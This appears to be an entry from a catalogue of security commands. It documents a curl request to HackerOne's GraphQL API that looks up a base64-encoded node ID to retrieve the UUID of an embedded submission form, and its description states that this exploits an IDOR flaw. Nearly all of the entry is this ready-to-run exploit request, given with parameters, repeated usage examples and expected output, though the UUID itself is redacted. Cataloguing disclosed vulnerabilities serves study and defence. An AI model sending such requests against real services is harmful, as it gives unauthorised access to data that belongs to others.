---
id: cmd-graphql-query-node-uuid
data: >-
  curl -X POST https://api.hackerone.com/graphql -H "Content-Type:
  application/json" -d '{"query": "query { node(id:
  \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on
  EmbeddedSubmissionForm { uuid } } }"}'
tags:
  - graphql
  - query
  - uuid
type: command
output: '{ "data": { "node": { "uuid": "████" } } }'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.635Z'
verified: false
validated: true
submitted: true
---
# graphql-query-node-uuid

## Command

```bash
curl -X POST https://api.hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on EmbeddedSubmissionForm { uuid } } }"}'
```

## Description

Sends a GraphQL query to HackerOne's node interface to retrieve the UUID of an EmbeddedSubmissionForm using a base64-encoded node ID, exploiting IDOR.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| id | Base64-encoded node ID in the query | Yes |
| query | GraphQL query string | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query { node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on EmbeddedSubmissionForm { uuid } } }"}'
```

### Advanced Usage

With variables (though empty here):
```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "...", "variables": {}}'
```

## Expected Output

JSON with UUID: `{ "data": { "node": { "id": "...", "uuid": "████" } } }`.

## Related

- [[Related Procedure: Query-GraphQL-Node-to-Retrieve-UUID]]
